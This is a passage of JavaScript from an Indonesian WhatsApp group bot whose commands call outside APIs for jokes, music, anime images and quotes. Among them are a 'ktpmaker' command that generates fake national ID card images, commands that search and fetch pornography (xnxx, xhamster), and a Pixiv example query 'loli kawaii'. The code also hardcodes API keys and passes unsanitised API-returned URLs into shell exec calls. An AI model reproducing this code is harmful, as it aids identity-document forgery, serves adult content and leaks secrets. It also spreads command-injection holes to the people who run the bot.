		            if (isBanned) return reply(aml.baned)
			        if (!isGroup) return reply(aml.groupo)
                    if (isLimit(sender)) return reply(aml.limitend)
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} 12 12 2020`)
                    reply (aml.wait)
                    tanggal = args[0]
                    bulan = args[1]
                    tahun = args[2]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/jadian/${tanggal}/${bulan}/${tahun}?apikey=${lolhuman}`)
                    get_result = get_result.result
                    ini_txt = `Karakteristik : ${get_result.karakteristik}\n`
                    ini_txt += `Deskripsi : ${get_result.deskripsi}`
                    reply(ini_txt)
                    await limitAdd(sender)
                    break
         case 'tebakumur':
                    if (!isGroup) return reply(aml.groupo)
			        if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (!isGroup) return reply(aml.groupo)
                    if (isLimit(sender)) return reply(aml.limitend)
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} FvnkyStore`)
                    ini_name = args.join('  ')
                    reply (aml.wait)
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/tebakumur?apikey=${lolhuman}&name=${ini_name}`)
                    get_result = get_result.result
                    ini_txt = `Nama : ${get_result.name}\n`
                    ini_txt += `Umur : ${get_result.age}`
                    reply(ini_txt)
                    await limitAdd(sender)
                    break
        case 'joox':
                    if (!isGroup) return reply(aml.groupo)
			        if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
			        if (!isGroup) return reply(aml.groupo)
                    if (isLimit(sender)) return reply(aml.limitend)
                    if (args.length == 0) return reply(`Example: ${prefix + command} mekukis Senja`)
                    reply (aml.wait)
                    query = args.join('  ')
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/jooxplay?apikey=${lolhuman}&query=${query}`)
                    get_result = get_result.result
                    cuy = `
─────────────────────
◪ 「 JOOX PLAY 」
│
└ ☞ Judul: ${get_result.info.song}
    ☞ Artis: ${get_result.info.singer}
    ☞ Album: ${get_result.info.album}
    ☞ Durasi: ${get_result.info.duration}
    ☞ Tipe: ${command}
─────────────────────`
                    thumbnail = await getBuffer(get_result.image)
                    await aldi.sendMessage(from, thumbnail, image, { quoted: fkontak, caption: cuy, contextInfo: { forwardingScore: 1, isForwarded: true} })
                    get_audio = await getBuffer(get_result.audio[0].link)
                    await aldi.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', ptt:true, filename: `${get_result.info.song}.mp3`, quoted: fkontak, duration: 99999999999, contextInfo: { forwardingScore: 508, isForwarded: true}})
                    await limitAdd(sender)
                    break
       case 'alay': 
                    if (!isGroup) return reply(aml.groupo)
					if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
			        if (!isGroup) return reply(aml.groupo)
                    if (isLimit(sender)) return reply(aml.limitend)
				    if (args.length < 1) return reply(`Contoh: aldiFvnky`)
				    reply (aml.wait)
					gatauda = body.slice(11)
					anu = await fetchJson(`http://api.lolhuman.xyz/api/alay?apikey=${lolhuman}&text=${gatauda}`)
					reply(anu.result)
					await limitAdd(sender)
					break
	    case 'purba':
		case 'bpurba':
					if (!isGroup) return reply(aml.groupo)
			        if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (!isGroup) return reply(aml.groupo)
                    if (isLimit(sender)) return reply(aml.limitend)
				    if (args.length < 1) return reply(`Contoh: aldiFvnky`)
				    reply (aml.wait)
					gatauda = body.slice(11)
					anu = await fetchJson(`http://api.lolhuman.xyz/api/bahasapurba?apikey=${lolhuman}&text=${gatauda}`)
					reply(anu.result)
					await limitAdd(sender)
					break
		case 'BK':
		case 'bk':
		case 'besarkecil': 
					if (!isGroup) return reply(aml.groupo)
			        if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
			        if (!isGroup) return reply(aml.groupo)
                    if (isLimit(sender)) return reply(aml.limitend)
				    if (args.length < 1) return reply(`Contoh: aldiFvnky`)
				    reply (aml.wait)
					gatauda = body.slice(11)
					anu = await fetchJson(`http://api.lolhuman.xyz/api/upperlower?apikey=${lolhuman}&text=${gatauda}`)
					reply(anu.result)
					await limitAdd(sender)
					break
		case 'hilih': 
					if (!isGroup) return reply(aml.groupo)
			        if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (!isGroup) return reply(aml.groupo)
                    if (isLimit(sender)) return reply(aml.limitend)
				    if (args.length < 1) return reply(`Contoh: aldiFvnky`)
				    reply (aml.wait)
					gatauda = body.slice(11)
					anu = await fetchJson(`http://api.lolhuman.xyz/api/hilih?apikey=${lolhuman}&text=${gatauda}`)
					reply(anu.result)
					await limitAdd(sender)
					break
        case 'namaninja': 
                    if (!isGroup) return reply(aml.groupo)
			        if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (!isGroup) return reply(aml.groupo)
                    if (isLimit(sender)) return reply(aml.limitend)
				    if (args.length < 1) return reply(`Contoh: aldiFvnky`)
				    reply (aml.wait)
					gatauda = body.slice(11)
					anu = await fetchJson(`http://lolhuman.herokuapp.com/api/ninja?apikey=${lolhuman}&nama=${gatauda}`)
					reply(anu.result)
					await limitAdd(sender)
					break
        case 'tebakbendera':
                    if (!isGroup) return reply(aml.groupo)
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
			        if (!isGroup) return reply(aml.groupo)
                    if (isLimit(sender)) return reply(aml.limitend)
                    reply (aml.wait)
					anu = await fetchJson(`http://lolhuman.herokuapp.com/api/tebak/bendera?apikey=${lolhuman}`, {method: 'get'})
					tebakbender = `bendera apa ini?\n${anu.result.flag}`
					setTimeout( () => {
					aldi.sendMessage(from, '➸ Jawaban : '+anu.result.name, text, {quoted: fkontak}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					aldi.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					aldi.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					aldi.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					aldi.sendMessage(from, tebakbender, text, {quoted: fkontak}) // ur cods
					}, 0) // 1000 = 1s,
					await limitAdd(sender)
					break
	case 'dompet':
				    if (!isGroup) return reply(aml.groupo)
					if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (!isGroup) return reply(aml.groupo)
				    const kantong = checkATMuser(sender)
				    reply(ind.uangkau(pushname, sender, kantong))
				    break
	case 'baka2':
			            if (!isGroup) return reply(aml.groupo)
					    if (!isRegistered) return reply(aml.noregis)
		                if (isBanned) return reply(aml.baned)
					    if (!isGroup) return reply(aml.groupo)
                        if (isLimit(sender)) return reply(aml.limitend)
                        reply (aml.wait)
		                Buffer = await getBuffer(`http://api.lolhuman.xyz/api/random2/baka?apikey=${lolhuman}`)
                        aldi.sendMessage(from, Buffer, image, { quoted: fkontak })
                        await limitAdd(sender)
                       break
         case 'sagiri':
			            if (!isGroup) return reply(aml.groupo)
					    if (!isRegistered) return reply(aml.noregis)
		                if (isBanned) return reply(aml.baned)
					    if (!isGroup) return reply(aml.groupo)
                        if (isLimit(sender)) return reply(aml.limitend)
                        reply (aml.wait)
		                Buffer = await getBuffer(`http://api.lolhuman.xyz/api/random/sagiri?apikey=${lolhuman}`)
                        aldi.sendMessage(from, Buffer, image, { quoted: fkontak })
                        await limitAdd(sender)
                       break
       case 'wallpaperanime':
			        if (!isGroup) return reply(aml.groupo)
		            if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (!isGroup) return reply(aml.groupo)
                    if (isLimit(sender)) return reply(aml.limitend)
                    await limitAdd(sender)
                    reply (aml.wait)
                    Buffer = await getBuffer(`http://api.lolhuman.xyz/api/random2/wallpaper?apikey=${lolhuman}`)
                    aldi.sendMessage(from, Buffer, image, { quoted: fkontak })
                    break

		case 'semoji':
					if (!isGroup) return reply(aml.groupo)
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
			        if (!isGroup) return reply(aml.groupo)
                    if (isLimit(sender)) return reply(aml.limitend)
                    await limitAdd(sender)
                    reply (aml.wait)
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} 😭`)
                    emoji = args[0]
                    try {
                        emoji = encodeURI(emoji[0])
                    } catch {
                        emoji = encodeURI(emoji)
                    }
                    ini_anu = await getBuffer(`http://api.lolhuman.xyz/api/smoji/${emoji}?apikey=${lolhuman}`)
                    aldi.sendMessage(from, ini_anu, sticker, {quoted: fkontak})
                    break
          case 'fakedonald':
                    if (!isGroup) return reply(aml.groupo)
			        if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
			        if (!isGroup) return reply(aml.groupo)
                    if (isLimit(sender)) return reply(aml.limitend)
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} FvnkyStore`)
                    await limitAdd(sender)
                    reply (aml.wait)
                    ini_txt = args.join('  ')
                    ini_anu = await getBuffer(`http://api.lolhuman.xyz/api/tweettrump?apikey=${lolhuman}&text=${ini_txt}`)
                    aldi.sendMessage(from, ini_anu, image, {quoted: fkontak})
                    break
           case 'faketoko':
                        if (!isGroup) return reply(aml.groupo)
					    if (!isRegistered) return reply(aml.noregis)
		                if (isBanned) return reply(aml.baned)
					    if (!isGroup) return reply(aml.groupo)
                        if (isLimit(sender)) return reply(aml.limitend)
                        await limitAdd(sender)
                        reply (aml.wait)
                        await reply(teks = "Tahu Bacem", url_image = "https://i.ibb.co/JdfQ73m/photo-2021-02-05-10-13-39.jpg", title = "aldi", code = "IDR", price = 1000000)
                        break
          case 'ktpmaker':
                    if (!isGroup) return reply(aml.groupo)
			        if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (!isGroup) return reply(aml.groupo)
                    if (isLimit(sender)) return reply(aml.limitend)
                    if (args.length == 0) return reply(`Usage: ${prefix + command} nik|provinsi|kabupaten|nama|tempat, tanggal lahir|jenis kelamin|jalan|rt/rw|kelurahan|kecamatan|agama|status nikah|pekerjaan|warga negara|berlaku sampai|url_image\n\nContoh: ${prefix + command} 456127893132123|bumipertiwi|fatamorgana|aldi|mars, 99-99-9999|belum ditemukan|jl wardoyo|999/999|turese|imtuni|alhamdulillah islam|jomblo kack|mikirin dia|indo ori no kw|hari kiamat|https://i.ibb.co/Xb2pZ88/test.jpg`)
                    await limitAdd(sender)
                    reply (aml.wait)
                    get_args = args.join('  ').split("|")
                    nik = get_args[0]
                    prov = get_args[1]
                    kabu = get_args[2]
                    name = get_args[3]
                    ttl = get_args[4]
                    jk = get_args[5]
                    jl = get_args[6]
                    rtrw = get_args[7]
                    lurah = get_args[8]
                    camat = get_args[9]
                    agama = get_args[10]
                    nikah = get_args[11]
                    kerja = get_args[12]
                    warga = get_args[13]
                    until = get_args[14]
                    img = get_args[15]
                    ini_anu = await getBuffer(`http://api.lolhuman.xyz/api/ktpmaker?apikey=${lolhuman}&nik=${nik}&prov=${prov}&kabu=${kabu}&name=${name}&ttl=${ttl}&jk=${jk}&jl=${jl}&rtrw=${rtrw}&lurah=${lurah}&camat=${camat}&agama=${agama}&nikah=${nikah}&kerja=${kerja}&warga=${warga}&until=${until}&img=${img}`)
                    aldi.sendMessage(from, ini_anu, image, {quoted: fkontak})
                    break
           case 'xnxxsearch':
                    if (!isGroup) return reply(aml.groupo)
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
			        if (!isGroup) return reply(aml.groupo)
                    if (isLimit(sender)) return reply(aml.limitend)
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} Japanese`)
                    query = args.join('  ')
                    reply (aml.wait)
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/xnxxsearch?apikey=${lolhuman}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                    ini_txt += `Title : ${x.title}\n`
                    ini_txt += `Views : ${x.views}\n`
                    ini_txt += `Duration : ${x.duration}\n`
                    ini_txt += `Uploader : ${x.uploader}\n`
                    ini_txt += `Link : ${x.link}\n`
                    ini_txt += `Thumbnail : ${x.thumbnail}\n\n`
                    }
                    reply(ini_txt)
                    await limitAdd(sender)
                    break
           case 'xnxx':
                    if (!isGroup) return reply(aml.groupo)
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
			        if (!isGroup) return reply(aml.groupo)
                    if (isLimit(sender)) return reply(aml.limitend)
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} https://www.xnxx.com/video-uy5a73b/mom_is_horny_-_brooklyn`)
                    query = args.join('  ')
                    await limitAdd(sender)
                    reply (aml.wait)
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/xnxx?apikey=${lolhuman}&url=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `View : ${get_result.view}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Like : ${get_result.like}\n`
                    ini_txt += `Dislike : ${get_result.dislike}\n`
                    ini_txt += `Comment : ${get_result.comment}\n`
                    ini_txt += `Tag : ${get_result.tag.join(", ")}\n`
                    ini_txt += `Description : ${get_result.description}\n`
                    ini_txt += "Link : \n"
                    ini_link = get_result.link
                    for (var x of ini_link) {
                        ini_txt += `${x.type} - ${x.link}\n\n`
                    }
                    thumbnail = await getBuffer(get_result.thumbnail)
                    aldi.sendMessage(from, thumbnail, image, { quoted: fkontak, caption: ini_txt })
                    break
          case 'pixiv':
                    if (!isGroup) return reply(aml.groupo)
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
			        if (!isGroup) return reply(aml.groupo)
                    if (isLimit(sender)) return reply(aml.limitend)
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} loli kawaii`)
                    query = args.join('  ')
                    await limitAdd(sender)
                    reply (aml.wait)
                    ini_anu = await getBuffer(`http://api.lolhuman.xyz/api/pixiv?apikey=${lolhuman}&query=${query}`)
                    aldi.sendMessage(from, ini_anu, image, {quoted: fkontak})
                    break
         case 'pixivdl':
                    if (!isGroup) return reply(aml.groupo)
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
			        if (!isGroup) return reply(aml.groupo)
                    if (isLimit(sender)) return reply(aml.limitend)
                    await limitAdd(sender)
                    reply (aml.wait)
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} 63456028`)
                    query = args[0]
                    ini_anu = await getBuffer(`http://api.lolhuman.xyz/api/pixivdl/${pixivid}?apikey=${lolhuman}`)
                    aldi.sendMessage(from, ini_anu, image, {quoted: fkontak})
                    break
        case 'xhamstersearch':
                    if (!isGroup) return reply(aml.groupo)
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
			        if (!isGroup) return reply(aml.groupo)
                    if (isLimit(sender)) return reply(aml.limitend)
                    reply (aml.wait)
                    await limitAdd(sender)
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} Japanese`)
                    query = args.join('  ')
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/xhamstersearch?apikey=${lolhuman}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Views : ${x.views}\n`
                        ini_txt += `Duration : ${x.duration}\n`
                        ini_txt += `Link : ${x.link}\n\n`
                    }
                    reply(ini_txt)
                    break
//WIBUUUUUUUUUUUUUUUUUUUUUUUU///
/////////////////////////////////////////////////////////////
////WIBU WIBU WIBU WIBU DSNI YAAA ASU////
        case 'xhamster':
                    if (!isGroup) return reply(aml.groupo)
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
			        if (!isGroup) return reply(aml.groupo)
                    if (isLimit(sender)) return reply(aml.limitend)
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} https://xhamster.com/videos/party-with-friends-end-in-awesome-fucking-5798407`)
                    query = args.join('  ')
                    await limitAdd(sender)
                    reply (aml.wait)
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/xhamster?apikey=${lolhuman}&url=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Uploader : ${get_result.author}\n`
                    ini_txt += `Upload : ${get_result.upload}\n`
                    ini_txt += `View : ${get_result.views}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Like : ${get_result.likes}\n`
                    ini_txt += `Dislike : ${get_result.dislikes}\n`
                    ini_txt += `Comment : ${get_result.comments}\n`
                    ini_txt += "Link : \n"
                    link = get_result.link
                    for (var x of link) {
                        ini_txt += `${x.type} - ${x.link}\n\n`
                    }
                    thumbnail = await getBuffer(get_result.thumbnail)
                    aldi.sendMessage(from, thumbnail, image, { quoted: fkontak, caption: ini_txt })
                    break 
	case 'pictwaifu':
					if (!isGroup) return reply(aml.groupo)
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
			        if (!isGroup) return reply(aml.groupo)
                    if (isLimit(sender)) return reply(aml.limitend)
					reply (aml.wait)
					await limitAdd(sender)
					anu = await fetchJson(`https://api.vhtear.com/pinterest?query=waifukawai&apikey=${apivhtear}`, {method: 'get'})
					var mi = JSON.parse(JSON.stringify(anu.result));
					var ku =  mi[Math.floor(Math.random() *  mi.length)];
					nye = await getBuffer(ku)
					aldi.sendMessage(from, nye, image, { caption: 'OHAYO DARLING!!', quoted: fkontak })
					break
		case 'nsfw_avatar':
				      if (!isGroup) return reply(aml.groupo)
				      if (!isRegistered) return reply(aml.noregis)
		              if (isBanned) return reply(aml.baned)
			          if (!isGroup) return reply(aml.groupo)
                      if (isLimit(sender)) return reply(aml.limitend)
                      await limitAdd(sender)
                      reply (aml.wait)
		              Buffer = await getBuffer(`http://api.lolhuman.xyz/api/random2/${command}?apikey=${lolhuman}`)
		              aldi.sendMessage(from, Buffer, image, { quoted: fkontak })
		              break
		case 'pictneko':
					   if (!isGroup) return reply(aml.groupo)
				       if (!isRegistered) return reply(aml.noregis)
		               if (isBanned) return reply(aml.baned)
			           if (!isGroup) return reply(aml.groupo)
                       if (isLimit(sender)) return reply(aml.limitend)
					   reply (aml.wait)
					   await limitAdd(sender)
					   anu = await fetchJson(`https://api.vhtear.com/pinterest?query=nekoanimekawai&apikey=${apivhtear}`, {method: 'get'})
					   var mi = JSON.parse(JSON.stringify(anu.result));
					   var ku =  mi[Math.floor(Math.random() *  mi.length)];
					   nye = await getBuffer(ku)
					   aldi.sendMessage(from, nye, image, { caption: 'OHAYO ONII CHAN!!', quoted: fkontak })
					   break
	case 'senku':
			           if (!isGroup) return reply(aml.groupo)
				       if (!isRegistered) return reply(aml.noregis)
		               if (isBanned) return reply(aml.baned)
			           if (!isGroup) return reply(aml.groupo)
                       if (isLimit(sender)) return reply(aml.limitend)
                       reply (aml.wait)
					   anu = await fetchJson(`https://api.vhtear.com/pinterest?query=senku&apikey=${apivhtear}`, {method: 'get'})
					   var sen = JSON.parse(JSON.stringify(anu.result));
					   var ku =  sen[Math.floor(Math.random() *  sen.length)];
					   nye = await getBuffer(ku)
					   aldi.sendMessage(from, nye, image, { caption: 'senku!!', quoted: fkontak })
					   await limitAdd(sender)
					   break
	case 'kurumi2':
			           if (!isGroup) return reply(aml.groupo)
				       if (!isRegistered) return reply(aml.noregis)
		               if (isBanned) return reply(aml.baned)
			           if (!isGroup) return reply(aml.groupo)
                       if (isLimit(sender)) return reply(aml.limitend)
                       await limitAdd(sender)
                       reply (aml.wait)
					   anu = await fetchJson(`https://api.vhtear.com/pinterest?query=kurumitokisakikawai&apikey=${apivhtear}`, {method: 'get'})
					   var kur = JSON.parse(JSON.stringify(anu.result));
					   var imi =  kur[Math.floor(Math.random() * kur.length)];
					   nye = await getBuffer(imi)
					   aldi.sendMessage(from, nye, image, { caption: 'kurumi chan!!', quoted: fkontak })
					   break
	case 'nakanomiku':
				       if (!isGroup) return reply(aml.groupo)
				       if (!isRegistered) return reply(aml.noregis)
		               if (isBanned) return reply(aml.baned)
			           if (!isGroup) return reply(aml.groupo)
                       if (isLimit(sender)) return reply(aml.limitend)
                       await limitAdd(sender)
                       reply (aml.wait)
					   anu = await fetchJson(`https://api.vhtear.com/pinterest?query=Nakanomiku&apikey=${apivhtear}`, {method: 'get'})
					   var mi = JSON.parse(JSON.stringify(anu.result));
					   var ku =  mi[Math.floor(Math.random() *  mi.length)];
					   nye = await getBuffer(ku)
					   aldi.sendMessage(from, nye, image, { caption: 'miku chan!!', quoted: fkontak })
					   break
	case 'wibu':
			           if (!isGroup) return reply(aml.groupo)
				       if (!isRegistered) return reply(aml.noregis)
		               if (isBanned) return reply(aml.baned)
			           if (!isGroup) return reply(aml.groupo)
                       if (isLimit(sender)) return reply(aml.limitend)
					   reply (aml.wait)
					   await limitAdd(sender)
					   anu = await fetchJson(`https://api.vhtear.com/randomwibu&apikey=${apivhtear}`, {method: 'get'})
					   if (anu.error) return reply(anu.error)
					   kontol = await getBuffer(anu.result.foto)
					   wibu = ` ➸ nama ${anu.result.nama} ➸ deskripsi ${anu.result.deskripsi}`
					   aldi.sendMessage(from, kontol, image, {quoted: ftoko, caption: wibu})
					   break
//BERHENTI//////////////
/////////////////////////////
	case 'quotes2':
			           if (!isGroup) return reply(aml.groupo)
				       if (!isRegistered) return reply(aml.noregis)
		               if (isBanned) return reply(aml.baned)
			           if (!isGroup) return reply(aml.groupo)
                       if (isLimit(sender)) return reply(aml.limitend)
				       quotes = body.slice(1)
				       reply (aml.wait)
				       const quo =['Lebih baik mengerti sedikit daripada salah mengerti.','Hampir semua pria memang mampu bertahan menghadapi kesulitan. Namun, jika Anda ingin menguji karakter sejati pria, beri dia kekuasaan.','Bila tekad seseorang kuat dan teguh, Tuhan akan bergabung dalam usahanya.','Penderitaan adalah pelajaran.','Ilmu pengetahuan tanpa agama adalah pincang.','Hidup itu seperti sebuah sepeda, agar tetap seimbang kita harus tetap bergerak.','Perbedaan masa lalu, sekarang, dan masa depan tak lebih dari ilusi yang keras kepala.','Sebuah meja, sebuah kursi, semangkuk buah, dan sebuah biola; apa lagi yang dibutuhkan agar seseorang bisa merasa bahagia?','Belas kasihanlah terhadap sesama, bersikap keraslah terhadap diri sendiri.','Cara paling baik untuk menggerakkan diri Anda ialah memberi tugas kepada diri sendiri.','Kita tidak boleh kehilangan semangat. Semangat adalah stimulan terkuat untuk mencintai, berkreasi dan berkeinginan untuk hidup lebih lama.','Manusia akan bahagia selama ia memilih untuk bahagia.','Saya tidak berharap menjadi segalanya bagi setiap orang. Saya hanya ingin menjadi sesuatu untuk seseorang.','Apabila sempurna akal seseorang, maka sedikit perkataannya.','Bahagialah orang yang dapat menjadi tuan untuk dirinya, menjadi kusir untuk nafsunya dan menjadi kapten untuk bahtera hidupnya.','Sahabat yang jujur lebih besar harganya daripada harta benda yang diwarisi dari nenek moyang.','Yang paling mekelahkan dalam hidup adalah menjadi orang yang tidak tulus.','Terbuka untuk Anda, begitulah Tuhan memberi kita jalan untuk berusaha. Jangan pernah berfikir jalan sudah tertutup.','Penundaan adalah kuburan dimana peluang dikuburkan.','Cinta bukan saling menatap mata, namun mekihat ke arah yang sama bersama-sama.','Kita adalah apa yang kita kerjakan berulang kali. Dengan demikian, kecemerlangan bukan tindakan, tetapi kebiasaan.','Jangan pernah menkontol menjadikan putra atau putri Anda menjadi seperti Anda. Diri Anda hanya cukup satu saja.','Jika Anda bisa membuat orang lain tertawa, maka Anda akan mendapatkan semua cinta yang Anda inginkan.','Masalah akan datang cepat atau lambat. Jika masalah datang, sambut dengan sebaik mungkin. Semakin ramah Anda menyapanya, semakin cepat ia pergi.','Kita tak bisa mekakukan apapun untuk mengubah masa lalu. Tapi apapun yang kita lakukan bisa mengubah masa depan.','Kesabaran adalah teman dari kebijaksanaan.','Orang-orang kreatif termotivasi oleh keinginan untuk maju, bukan oleh keinginan untuk mengalahkan orang lain.','Dimanapun engkau berada selalulah menjadi yang terbaik dan berikan yang terbaik dari yang bisa kita berikan.','Kebencian seperti halnya cinta, berkobar karena hal-hal kecil.','Anda tidak perlu harus berhasil pada kali pertama.','Satu jam yang intensif, jauh lebih baik dan menguntungkan daripada bertahun-tahun bermimpi dan merenung-renung.','Hal terbaik yang bisa Anda lakukan untuk orang lain bukanlah membagikan kekayaan Anda, tetapi membantu dia untuk memiliki kekayaannya sendiri.','Tidak ada jaminan keberhasilan, tetapi tidak berusaha adalah jaminan kegagalan.','Aku tidak tahu kunci sukses itu apa, tapi kunci menuju kegagalan adalah menkontol membuat semua orang senang.']
				       const tes = quo[Math.floor(Math.random() * quo.length)]
				       aldi.sendMessage(from, ''+tes+'\n\n_By : aldiganz._', text, { quoted: fkontak })
				       await limitAdd(sender)
				       break
//IMAGES IMAGES WELCOME TO aldiFVNKY//
 case 'facebookpage':
	                    if (!isGroup) return reply(aml.groupo)
				        if (!isRegistered) return reply(aml.noregis)
		                if (isBanned) return reply(aml.baned)
			            if (!isGroup) return reply(aml.groupo)
                        if (isLimit(sender)) return reply(aml.limitend)
	                    var imgbb = require('imgbb-uploader')
	                    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	                    ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	                    reply (aml.wait)
	                    await limitAdd(sender)
	                    owgi = await aldi.downloadAndSaveMediaMessage(ted)
	                    tels = body.slice(14)
	                    anu = await imgbb("a202ba96519e365a76a12643c6aa7bd9", owgi)
	                    hehe = await getBuffer(`https://videfikri.com/api/textmaker/facebookprof/?urlgbr=${anu.display_url}&text=${tels}`)
	                    aldi.sendMessage(from, hehe, image, {quoted: fkontak})
	                    } else {
	                    reply('Jangan tambah kan apapun pada command')
	                    }
	                    break
	case 'costumwp':
	                    if (!isGroup) return reply(aml.groupo)
				        if (!isRegistered) return reply(aml.noregis)
		                if (isBanned) return reply(aml.baned)
			            if (!isGroup) return reply(aml.groupo)
                        if (isLimit(sender)) return reply(aml.limitend)
	                    var imgbb = require('imgbb-uploader')
	                    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	                    ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	                    reply (aml.wait)
	                    await limitAdd(sender)
	                    owgi = await aldi.downloadAndSaveMediaMessage(ted)
	                    tels = body.slice(14)
	                    anu = await imgbb("a202ba96519e365a76a12643c6aa7bd9", owgi)
	                    hehe = await getBuffer(`https://videfikri.com/api/textmaker/customwp/?urlgbr=${anu.display_url}`)
	                    aldi.sendMessage(from, hehe, image, {quoted: fkontak})
	                    } else {
	                    reply('Jangan tambah kan apapun pada command')
	                    }
	                   break
              case 'sfire':
					   if (!isGroup) return reply(aml.groupo)
				       if (!isRegistered) return reply(aml.noregis)
		               if (isBanned) return reply(aml.baned)
			           if (!isGroup) return reply(aml.groupo)
                       if (isLimit(sender)) return reply(aml.limitend)
                                     var imgbb = require('imgbb-uploader')
                                        if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                                        ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
                                        reply (aml.wait)
					                    owgi = await aldi.downloadAndSaveMediaMessage(ger)
					                    anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", owgi)
                                        teks = `${anu.display_url}`
                                        ranpll = getRandom('.gif')
                                        ranoll = getRandom('.webp')
                                        anu1ll = await fetchJson(`https://api.zeks.xyz/api/sfire?img=${teks}&apikey=${ZeksApi}`,{method:'get'})
                                        exec(`wget ${anu1ll.result} -O ${ranpll} && ffmpeg -i ${ranpll} -vcodec libwebp -filter:v fps=fps=9 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranoll}`, (err) => {
                                                fs.unlinkSync(ranpll)
                                                if (err) return cheat(aml.error)
                                                buffer = fs.readFileSync(ranoll)
                                                aldi.sendMessage(from, buffer, sticker, {quoted: mek})
                                                fs.unlinkSync(ranoll)
                                             })
                                    
                                             } else {
                                                 cheat('Gunakan foto!')
                                             }           
                                          break
              case 'triggered':
               case 'trigger':
                       if (!isGroup) return reply(aml.groupo)
				       if (!isRegistered) return reply(aml.noregis)
		               if (isBanned) return reply(aml.baned)
			           if (!isGroup) return reply(aml.groupo)
                       if (isLimit(sender)) return reply(aml.limitend)
                       var imgbb = require('imgbb-uploader')
                       reply (aml.wait)
                       if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                       ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
                       damppa = await aldi.downloadAndSaveMediaMessage(ger)
                       aldiaa = await imgbb('a202ba96519e365a76a12643c6aa7bd9', damppa)
                       ranp = getRandom('.gif')
                       rano = getRandom('.webp')
                       kontol = `https://some-random-api.ml/canvas/triggered?avatar=${aldiaa.display_url}`
                       exec(`wget ${kontol} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                       fs.unlinkSync(ranp)
                       if (err) return reply()
                       jadinyaa = fs.readFileSync(rano)
                       aldi.sendMessage(from, jadinyaa, sticker, {quoted: fkontak})
                       fs.unlinkSync(rano)
                                 })                  
                       } else {
                       reply('Reply Imagenya!!')
